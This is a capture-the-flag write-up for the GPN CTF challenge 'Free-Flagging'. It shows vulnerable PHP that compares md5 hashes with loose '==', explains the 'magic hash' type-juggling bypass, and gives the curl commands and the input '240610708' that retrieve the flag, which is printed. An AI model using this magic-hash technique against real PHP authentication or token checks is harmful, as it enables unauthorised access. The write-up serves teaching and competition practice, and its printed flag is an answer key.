# Free-Flagging
## Description

"You reached Free Parking" - sadly we ran out of money, but here have a free flag instead.

## Solution

If we visit the instance we get the source code:
```php
<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    highlight_file(__FILE__);
    exit;
}

$flag = getenv("FLAG");
$guess = file_get_contents('php://input');

//Check if user knows the flag
if (md5($flag) == md5($guess)) {
    echo("You correctly guessed the flag - " . $flag);
} else {
    echo("You guessed wrong: The flags hash is " . md5($flag) . " and the hash of your guess is " . md5($guess));
}
?>
```

The flag hash starts with `0e` which is vulnerable to "Magic Hash" attack, also `==` is used instead of `===` which helps with this attack.

```powershell
➜ curl https://mountshire-of-ludicrous-abundance.gpn23.ctf.kitctf.de -d 'x'
You guessed wrong: The flags hash is 0e457091929243384888029339511631 and the hash of your guess is 9dd4e461268c8034f5c8564e155c67a6
```

[https://github.com/spaze/hashes/blob/master/md5.md](https://github.com/spaze/hashes/blob/master/md5.md)

```powershell
➜ curl https://mountshire-of-ludicrous-abundance.gpn23.ctf.kitctf.de -d '240610708'
You correctly guessed the flag - GPNCTF{just_php_d01ng_php_th1ng5_abM2zz}
```

::: tip Flag
`GPNCTF{just_php_d01ng_php_th1ng5_abM2zz}`
:::

